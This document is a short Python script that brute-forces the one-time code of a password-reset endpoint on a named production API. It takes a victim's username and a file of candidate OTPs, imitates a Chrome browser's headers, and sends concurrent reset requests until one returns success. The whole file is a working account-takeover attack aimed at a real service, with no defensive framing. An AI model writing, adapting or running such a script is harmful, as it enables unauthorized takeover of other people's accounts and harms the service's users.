import concurrent.futures
import requests
import json

# Define the endpoint URL
url = "https://production.api.ezygo.app/api/v1/Xcr45_salt/password/reset"

username=input("Enter the Username : ")
otp_file=input("Otp File : ")
print("Wait for few minutes !")

# Define the headers
headers = {
    'Content-Length': '36',
    'Sec-Ch-Ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Origin': 'https://edu.ezygo.app',
    'Sec-Fetch-Site': 'same-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://edu.ezygo.app/',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9'
}

# Define a function that will handle each request
def send_request(otp):
    # Define the payload
    payload = {
        'otp': otp.strip(), # Remove the newline character from the OTP
        'username': username
    }

    # Send the POST request
    response = requests.post(url, headers=headers, data=json.dumps(payload))

    # Check the response status code
    if response.status_code == 200:
        # Print the OTP if the request was successful
        print("OTP found: ", otp)
        exit()
        exit(0);
    else:
        print("not match: ", otp)

# Open the file with the OTPs
with open(otp_file) as f:
    otps = f.readlines()

# Use a ThreadPoolExecutor to send multiple requests concurrently
with concurrent.futures.ThreadPoolExecutor() as executor:
    # Submit the requests to the executor
    futures = [executor.submit(send_request, otp) for otp in otps]
